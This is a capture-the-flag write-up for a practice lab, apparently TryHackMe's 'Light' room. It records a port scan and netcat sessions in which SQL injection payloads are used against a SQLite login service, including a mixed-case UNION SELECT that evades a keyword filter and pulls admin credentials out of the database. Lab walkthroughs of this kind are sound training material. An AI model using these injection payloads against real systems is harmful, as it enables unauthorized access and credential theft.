## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Welcome to the Light database application!
```
## IP-Address
```IP-Add
10.48.143.140
```
## RustScan
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu                                             Linux; protocol 2.0)
1337/tcp open  waste?  syn-ack ttl 62
```
## NetCat
```bash
nc 10.48.143.140 1337
Welcome to the Light database!
Please enter your username: somkey
Username not found.
Please enter your username: smokey
Password: [password omitted]
Please enter your username:
```
- Assuming these creds for `SSH` no luck, 
- Exploring more and found out
```bash
nc 10.48.143.140 1337
Welcome to the Light database!
Please enter your username: smokey
Password: [password omitted]
Please enter your username: '1 o^H
Error: near "1": syntax error
Please enter your username: smokey OR '
Error: unrecognized token: "'smokey OR '' LIMIT 30"
Please enter your username: vYQ5ngPpw8AdUmL
Username not found.
Please enter your username:
```
- Hint - SQLi Query backend/ liteDB
```bash
Please enter your username: somkey ' OR 1=1 --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username:
```
- More 
```bash
Welcome to the Light database!
Please enter your username: smokey' or '1'='1
Password: [password omitted]
Please enter your username: smokey' UNION SELECT name FROM sqlite_master WHERE type='table
Ahh there is a word in there I don't like :(
Please enter your username: smokey' uNiOn SeLeCt name FROM sqlite_master WHERE type='table
Password: [password omitted]
Please enter your username: admintable
Username not found.
 Please enter your username: smokey' UniOn SelEcT username FROM admintable WHERE username LIKE'TryHackMeAdmin
Password: [password omitted]
Please enter your username: TryHackMeAdmin
Username not found.
Please enter your username: smokey' UniOn SelEcT password FROM admintable WHERE username LIKE'TryHackMeAdmin
Password: [password omitted]
 Please enter your username: smokey' UniOn SelEcT password FROM admintable WHERE username LIKE'flag
Password: [flag omitted]
```
# END
